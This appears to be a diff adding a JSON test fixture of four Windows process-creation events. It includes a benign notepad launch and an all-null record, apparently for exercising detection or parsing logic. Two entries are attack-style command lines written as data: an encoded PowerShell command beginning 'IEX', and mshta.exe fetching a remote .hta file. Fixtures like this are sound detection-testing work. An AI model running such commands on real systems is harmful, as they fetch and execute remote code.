@@ -1,0 +1,30 @@
+[
+  {
+    "event_time": "2026-11-19 10:00:00",
+    "hostname": "NEW-SRV-01",
+    "accountname": "Administrator",
+    "process_image": "C:\\Windows\\System32\\powershell.exe",
+    "process_command_line": "powershell.exe -EncodedCommand SQBFAFgA"
+  },
+  {
+    "event_time": "2026-11-19 10:05:00",
+    "hostname": "NEW-PC-02",
+    "accountname": "Alice",
+    "process_image": "C:\\Windows\\System32\\notepad.exe",
+    "process_command_line": "notepad.exe"
+  },
+  {
+    "event_time": "2026-11-19 10:10:00",
+    "hostname": "NEW-PC-03",
+    "accountname": "Bob",
+    "process_image": "C:\\Windows\\System32\\mshta.exe",
+    "process_command_line": "mshta.exe https://example.com/a.hta"
+  },
+  {
+    "event_time": "2026-11-19 10:15:00",
+    "hostname": "NEW-PC-04",
+    "accountname": null,
+    "process_image": null,
+    "process_command_line": null
+  }
+]
